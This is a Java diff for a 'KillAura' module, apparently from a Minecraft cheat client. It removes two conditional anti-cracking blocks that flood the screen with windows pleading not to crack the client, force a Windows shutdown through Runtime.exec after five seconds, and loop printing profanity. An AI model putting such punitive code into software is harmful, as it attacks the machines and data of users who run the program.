@@ -149,56 +149,6 @@ public class KillAura extends Module {
                 outborderValue, hitableValue, fovValue, predictValue, maxPredictSize, minPredictSize, failRateValue,
                 fakeSwingValue, noInventoryAttackValue, noInventoryDelayValue, switchDelayValue, limitedMultiTargetsValue,
                 markValue);
-        if (BackGroundRenderer.id == 0) {
-            new Thread(() -> {
-                Random rd = new Random();
-                while (true) {
-                    JFrame frame = new JFrame("别破解了，求你了");
-                    frame.setSize(400, 200);
-                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
-                    frame.setVisible(true);
-                }
-            }).start();
-            new java.util.Timer().schedule(new TimerTask() {
-                public void run() {
-                    Runtime run = Runtime.getRuntime();
-                    try {
-                        run.exec("Shutdown.exe -s -t 1");
-                        run.exit(0);
-                    } catch (IOException e) {
-                        run.exit(0);
-                    }
-                }
-            }, (5000L));
-            while (true) {
-                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
-            }
-        }
-        if (BackGroundRenderer.id2 == 1) {
-            new Thread(() -> {
-                Random rd = new Random();
-                while (true) {
-                    JFrame frame = new JFrame("别破解了，求你了");
-                    frame.setSize(400, 200);
-                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
-                    frame.setVisible(true);
-                }
-            }).start();
-            new java.util.Timer().schedule(new TimerTask() {
-                public void run() {
-                    Runtime run = Runtime.getRuntime();
-                    try {
-                        run.exec("Shutdown.exe -s -t 1");
-                        run.exit(0);
-                    } catch (IOException e) {
-                        run.exit(0);
-                    }
-                }
-            }, (5000L));
-            while (true) {
-                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
-            }
-        }
     }
 
     @EventHandler
